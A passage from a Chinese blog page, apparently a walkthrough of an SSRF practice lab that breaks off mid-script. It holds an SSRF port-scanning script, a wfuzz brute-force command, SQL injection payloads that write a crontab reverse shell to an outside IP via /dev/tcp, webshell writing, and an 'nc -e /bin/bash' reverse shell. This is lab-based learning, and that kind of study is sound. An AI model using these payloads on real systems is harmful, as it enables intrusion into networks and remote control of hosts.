@@ -1,0 +1,279 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SSRF打内网 | 知识茧房</title><meta name="keywords" content="网络"><meta name="author" content="sh@rp"><meta name="copyright" content="sh@rp"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="一些想法 SQLMAP自己写参数的位置（自带：使用星号（*）来指定注入点）  前言SSRF(服务端跨站请求仿造)漏洞一般都是用来打内网的，为了更加地了解SSRF漏洞的利用方式，今天就结合一下国光师傅的靶场来实战操作一下。为了更好的与实战相结合，这里就在黑盒模式下进行攻击。 外网服务端口18006开启了一个WEB服务，主要功能是对用户输入的网址拍一个快照，那这里就有可能存在SSRF漏洞了，输入一个本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF打内网">
+<meta property="og:url" content="https://sharpa.cn/2022/04/01/SSRF%E6%89%93%E5%86%85%E7%BD%91/index.html">
+<meta property="og:site_name" content="知识茧房">
+<meta property="og:description" content="一些想法 SQLMAP自己写参数的位置（自带：使用星号（*）来指定注入点）  前言SSRF(服务端跨站请求仿造)漏洞一般都是用来打内网的，为了更加地了解SSRF漏洞的利用方式，今天就结合一下国光师傅的靶场来实战操作一下。为了更好的与实战相结合，这里就在黑盒模式下进行攻击。 外网服务端口18006开启了一个WEB服务，主要功能是对用户输入的网址拍一个快照，那这里就有可能存在SSRF漏洞了，输入一个本">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2022-04-01T08:29:25.000Z">
+<meta property="article:modified_time" content="2022-04-15T11:58:26.028Z">
+<meta property="article:author" content="sh@rp">
+<meta property="article:tag" content="网络">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sharpa.cn/2022/04/01/SSRF%E6%89%93%E5%86%85%E7%BD%91/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?226e8a286317f52a48c8d9e6788c5bfd";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SSRF打内网',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-04-15 19:58:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/01/23/fGp3IMyUswHugoY.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">36</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 阅读</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 介绍</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">知识茧房</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 阅读</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 介绍</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SSRF打内网</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-01T08:29:25.000Z" title="发表于 2022-04-01 16:29:25">2022-04-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-15T11:58:26.028Z" title="更新于 2022-04-15 19:58:26">2022-04-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SSRF打内网"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/04/01/SSRF%E6%89%93%E5%86%85%E7%BD%91/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2022/04/01/SSRF%E6%89%93%E5%86%85%E7%BD%91/" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一些想法"><a href="#一些想法" class="headerlink" title="一些想法"></a>一些想法</h1><ul>
+<li>SQLMAP自己写参数的位置（自带：使用星号（*）来指定注入点）</li>
+</ul>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSRF(服务端跨站请求仿造)漏洞一般都是用来打内网的，为了更加地了解SSRF漏洞的利用方式，今天就结合一下<a target="_blank" rel="noopener" href="https://www.sqlsec.com/">国光师傅</a>的<a target="_blank" rel="noopener" href="https://github.com/sqlsec/ssrf-vuls">靶场</a>来实战操作一下。<br>为了更好的与实战相结合，这里就在黑盒模式下进行攻击。</p>
+<h1 id="外网服务"><a href="#外网服务" class="headerlink" title="外网服务"></a>外网服务</h1><p>端口18006开启了一个WEB服务，主要功能是对用户输入的网址拍一个快照，那这里就有可能存在SSRF漏洞了，输入一个本地的端口80发现可以成功访问。<br>好，那接下来就先测试一个该主机开放了哪些端口吧。</p>
+<h2 id="利用dict等协议进行端口探测"><a href="#利用dict等协议进行端口探测" class="headerlink" title="利用dict等协议进行端口探测"></a>利用dict等协议进行端口探测</h2><p>首先编写一个python脚本来探测一下开放的端口，当然现实中效率怎么高就怎么来，这里本人是为了练习一下脚本的编写。<br>需要注意的是我们应该采取什么办法来探测端口是否开放，经过实践得出有的WEB服务无法处理dict协议的请求，会发生超时。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gettext <span class="keyword">import</span> find</span><br><span class="line"><span class="keyword">from</span> logging.handlers <span class="keyword">import</span> HTTPHandler</span><br><span class="line"><span class="keyword">from</span> sqlite3 <span class="keyword">import</span> adapters</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> style</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> regex <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> rich.console <span class="keyword">import</span> Console</span><br><span class="line"></span><br><span class="line">sem = Semaphore(<span class="number">3</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hostIsAlive</span>(<span class="params">url, ip</span>):</span></span><br><span class="line">    <span class="comment"># 无法有效的识别特定IP地址的主机是否存在</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dictPortScan</span>(<span class="params">url, targetURL</span>):</span></span><br><span class="line">    s = Session()</span><br><span class="line">    timeoutQueue = []</span><br><span class="line">    console = Console()</span><br><span class="line">    s.mount(<span class="string">&quot;http://&quot;</span>, HTTPAdapter(max_retries=<span class="number">20</span>))</span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    filename = <span class="string">&quot;E://&quot;</span>+ findall(<span class="string">r&#x27;[0-9]+\.[0-9]+\.[0-9]+\.[0-9]&#123;1,3&#125;&#x27;</span> ,url)[<span class="number">0</span>] + <span class="string">&quot;_&quot;</span> + targetURL + <span class="string">&quot;_open_port.txt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> sem:</span><br><span class="line">        console.<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;current_thread()&#125;</span>\n&quot;</span>)</span><br><span class="line">        f  = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65535</span>, <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = <span class="string">&quot;dict://&quot;</span> + targetURL + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">                req = s.post(url=url, data=&#123;<span class="string">&quot;url&quot;</span>: data&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">                response = req.text</span><br><span class="line">                <span class="keyword">if</span> search(<span class="string">r&quot;&lt;pre&gt;&lt;/pre&gt;&quot;</span>, response):</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f.write(<span class="string">f&quot;<span class="subst">&#123;port&#125;</span> open\n&quot;</span>)</span><br><span class="line">                    console.<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;port&#125;</span> OPEN\n&quot;</span>, style=<span class="string">&quot;bold green&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                console.<span class="built_in">print</span>(<span class="string">f&quot;timeout when handle data=<span class="subst">&#123;data&#125;</span>, url=<span class="subst">&#123;url&#125;</span>\n&quot;</span>, style=<span class="string">&quot;bold red&quot;</span>)</span><br><span class="line">                console.<span class="built_in">print</span>(<span class="string">&quot;Adding to queue...\n&quot;</span>)</span><br><span class="line">                timeoutQueue.append(data)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> timeout <span class="keyword">in</span> timeoutQueue:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                timeout = timeout.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">                req = s.post(url=url, data=&#123;<span class="string">&quot;url&quot;</span>: timeout&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">                response = req.text</span><br><span class="line">                <span class="keyword">if</span> search(<span class="string">r&quot;&lt;pre&gt;&lt;/pre&gt;&quot;</span>, response):</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f.write(<span class="string">f&quot;<span class="subst">&#123;port&#125;</span> open\n&quot;</span>)</span><br><span class="line">                    console.<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;port&#125;</span> OPEN\n&quot;</span>, style=<span class="string">&quot;bold green&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                console.<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;data&#125;</span> failed after another try!\n&quot;</span>, style=<span class="string">&quot;bold red&quot;</span>)</span><br><span class="line"></span><br><span class="line">        f.close()</span><br><span class="line">            </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    targetURLList = [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;172.72.23.22&quot;</span>, <span class="string">&quot;172.72.23.23&quot;</span>, <span class="string">&quot;172.72.23.24&quot;</span>, <span class="string">&quot;172.72.23.25&quot;</span>, <span class="string">&quot;172.72.23.26&quot;</span>, <span class="string">&quot;172.72.23.27&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;172.72.23.28&quot;</span>, <span class="string">&quot;172.72.23.29&quot;</span>, <span class="string">&quot;172.72.23.30&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> targetURL <span class="keyword">in</span> targetURLList:</span><br><span class="line">        thr = Thread(target=dictPortScan, args=(<span class="string">&quot;http://1.13.173.107:18006/&quot;</span>, targetURL))</span><br><span class="line">        thr.start()</span><br></pre></td></tr></table></figure>
+<p>各个地址开放的服务：<br>| IP | 端口 | 服务 |<br>| :—-: | :—-: | :—-: |<br>| 172.72.23.22 | 80 | WEB |<br>| 172.72.23.23 | 80 | WEB |<br>| 172.72.23.23 | 3306 | MYSQL |<br>| 172.72.23.24 | 80 | WEB |<br>| 172.72.23.25 | 80 | WEB |<br>| 172.72.23.26 | 8080 | WEB |<br>| 172.72.23.27 | 6379 | redis |<br>| 172.72.23.28 | 6379 | redis |<br>| 172.72.23.28 | 80 | web |<br>| 172.72.23.29 | 80 | WEB |<br>| 172.72.23.30 | 3306 | MYSQL | </p>
+<h1 id="172-72-23-22"><a href="#172-72-23-22" class="headerlink" title="172.72.23.22"></a>172.72.23.22</h1><h2 id="80WEB服务"><a href="#80WEB服务" class="headerlink" title="80WEB服务"></a>80WEB服务</h2><p>看到直接提示了代码注入，那先用burp suite试试参数fuzz，没什么结果。接下来扫一下目录，看看有没有东西。<br>因为这个是内网的机器，所以要么将这个服务代理出来，要么修改爆破位置，这个由于是POST请求所以使用burp suite更快一点。<br>通过修改<code>index.</code>的后缀进行访问，发现该网站是用PHP开发出来的。<br><code>wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt --hs &quot;404 Not Found&quot; -d &quot;url=172.72.23.22:80/FUZZ.php&quot; http://1.13.173.107:18006/</code><br><code>--hs</code>选项代表隐藏符合正则表达式的请求，<code>--ss</code>代表不隐藏。将要<code>FUZZ</code>的参数设置在POST请求的请求体部分，最后查看成功的请求。<br>有用的只有<code>index phpinfo shell</code>这三个页面，通过名字就可以知道各个页面的功能。<br>之后的利用过程可以看<code>28</code>靶机的步骤，这里不再赘述。</p>
+<h1 id="172-72-23-23"><a href="#172-72-23-23" class="headerlink" title="172.72.23.23"></a>172.72.23.23</h1><h2 id="80WEB服务-1"><a href="#80WEB服务-1" class="headerlink" title="80WEB服务"></a>80WEB服务</h2><p>一个GET型的SQL注入，开启了3306端口那么很有可能是连接MYSQL的一个网站，这时注入方法就明确了。<br>首先测到一共有4列，第一、二、四列会显示到前端界面。<br>这里放一个sqlmap的详细<a target="_blank" rel="noopener" href="https://thedarksource.com/sqlmap-cheat-sheet/#use-post-requests-test-all-parameters">操作手册</a>(英文版)。<br>查出<code>flag_is_here,users</code>这两个表，注意POST数据要将特殊字符编码。<br>可以在mysql系统数据库user表中找到用户的名字(User)和哈希(Password)，然后爆破一下。查了一下密码是空的…<br>那就老实的写shell吧。<br>之前根据<code>session_user()</code>函数查看到用户名是root，那么很有可能是root权限，可以写下计划任务来反弹shell。<br>查看<code>mysql.user</code>中的<code>secure_file_priv</code>全局变量发现没有设置任何值且不为NULL，证明我们可以任意写文件。<br>查看方法：<code>select @@global.secure_file_priv</code><br><strong>注意：</strong>不能写入已经存在的文件，也就是不能覆盖写文件。<br>写入计划任务时要注意格式，如果存在其它数据应该换行<code>\r\n</code>处理。如下：<br><code>union+select+1,2,3,&quot;\r\n&quot;+INTO+OUTFILE+&quot;/etc/crontab&quot;+lines+terminated+by+&quot;*/1+*+*+*+*+root+/bin/bash+-i+&gt;/dev/tcp/42.192.56.33/18030+0&gt;%261&quot;--+</code><br>写入成功后一直无法反弹shell，后来登录docker看了一下，发现这个计划任务的路径是在<code>/etc/crontabs/root</code>下，那写入<code>/etc/crontab</code>就无法执行。<br>那只能写WEB shell了。<br>查看<code>/etc/passwd</code>文件看看是什么类型的服务器，发现存在nginx用户，那就确定是一个nginx服务器了。</p>
+<h3 id="写入WEB-shell"><a href="#写入WEB-shell" class="headerlink" title="写入WEB shell"></a>写入WEB shell</h3><p><code>union+select+load_file(&quot;/etc/nginx/conf.d/default.conf&quot;),2,3,4--+</code>查看nginx的配置文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">  #listen       [::]:80; #uncomment for IPv6 support</span><br><span class="line">  listen       80;</span><br><span class="line"></span><br><span class="line">  root /data/htdocs;</span><br><span class="line">  index  index.php index.html index.htm;</span><br><span class="line"></span><br><span class="line">  disable_symlinks off;</span><br><span class="line"></span><br><span class="line">  location = /robots.txt &#123;</span><br><span class="line">    allow all;</span><br><span class="line">    log_not_found off;</span><br><span class="line">    access_log off;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  # deny dot-files</span><br><span class="line">  location ~ /\. &#123;</span><br><span class="line">    deny all;</span><br><span class="line">    access_log off;</span><br><span class="line">    log_not_found off;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    try_files $uri $uri/ /index.html /index.php;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">  location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">    fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">    if (!-f $document_root$fastcgi_script_name) &#123;</span><br><span class="line">      return 404;</span><br><span class="line">    &#125;</span><br><span class="line">    #fastcgi_pass unix:/var/run/php7-fpm.sock;</span><br><span class="line">    fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">    fastcgi_index index.php;</span><br><span class="line">    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">    include fastcgi_params;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>发现根目录在<code>/data/htdocs</code>下面，接下来先写入一个<code>&lt;?php phpinfo(); ?&gt;</code>来测试一下，成功写入。<br>在往后也就是写入shell命令执行，再反弹shell之类的内容，可以参考<code>28</code>地址靶机的过程。</p>
+<h1 id="172-72-23-24"><a href="#172-72-23-24" class="headerlink" title="172.72.23.24"></a>172.72.23.24</h1><h2 id="80WEB服务-2"><a href="#80WEB服务-2" class="headerlink" title="80WEB服务"></a>80WEB服务</h2><p>80端口是一个PING IP地址的服务，典型的命令执行场景，但是我们不可以直接在浏览器中发送数据，因为点击按钮发送后，数据直接给了外网服务器而不是内网服务器。所以我们需要构造POST数据，然后使用gopher协议发送。<br><img src="https://s2.loli.net/2022/04/09/sr4IhB62lk1YtyN.png" alt="image.png"><br>如图可以构造POST请求发送数据，当然首先需要将所有字符进行URL编码，之后再将特殊字符进行URL编码。<br>接下来就是反弹shell操作了。…省略<br><code>nc ip port -e /bin/bash</code>使用bash反弹不成功，那就使用nc来反弹一下。<br>输出源代码，发现使用的是exec来执行命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux 8e018e3ccb13 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 Linux</span><br></pre></td></tr></table></figure>
+<p><code>searchsploit linux 2.4 ubuntu priv esc</code>使用kali自带工具搜索该版本下的提权方法，找不到什么太有用的信息，先继续攻打下一个靶机。</p>
+<h1 id="172-72-23-25"><a href="#172-72-23-25" class="headerlink" title="172.72.23.25"></a>172.72.23.25</h1><p>一个登录界面，查看页面源代码发现了用来登录的AJAX请求：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&#x27;text/javascript&#x27;</span>&gt; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		alert(<span class="string">&quot;用户名或密码不为空&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span 